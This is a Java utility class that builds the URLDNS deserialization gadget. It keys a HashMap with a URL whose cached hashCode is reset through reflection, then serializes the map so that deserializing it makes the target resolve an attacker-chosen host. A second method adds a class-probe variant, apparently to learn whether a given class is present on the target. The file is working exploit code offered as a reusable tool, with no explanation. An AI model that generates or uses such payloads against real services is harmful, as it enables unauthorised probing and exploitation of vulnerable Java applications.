package util;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

import static util.GadgetUtils.makeClass;

public class URLDNSUtils {
    private final String url;
    URLStreamHandler handler = new URLStreamHandler() {
        @Override
        protected URLConnection openConnection(URL u) {
            return null;
        }
        @Override
        protected synchronized InetAddress getHostAddress(URL u){
            return null;
        }
    };
    public URLDNSUtils(String url){
        this.url = url;
    }
    public byte[] getBytes() throws Exception {
        HashMap<Object,String> hashmap=new HashMap<Object,String>();
        URL u=new URL(null,url,handler);
        hashmap.put(u,"Squirt1e");
        Class clazz=u.getClass();
        Field hashcode=clazz.getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(u,-1);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);

        objectOutputStream.writeObject(hashmap);
        byte[] bytes1 = byteArrayOutputStream.toByteArray();
//        String s = base64Encode(bytes1);
        return SerializerUtils.serialize(hashmap);
    }
    public Object FindClassByDNS(final String clazzName) throws Exception {

        HashMap ht = new HashMap();
        URL u = new URL(null,url,handler);
        // 以URL对象为key，以探测Class为value
        ht.put(u, makeClass(clazzName));
        ReflectionUtils.setFieldValue(u, "hashCode", -1);
        return ht;
    }
}
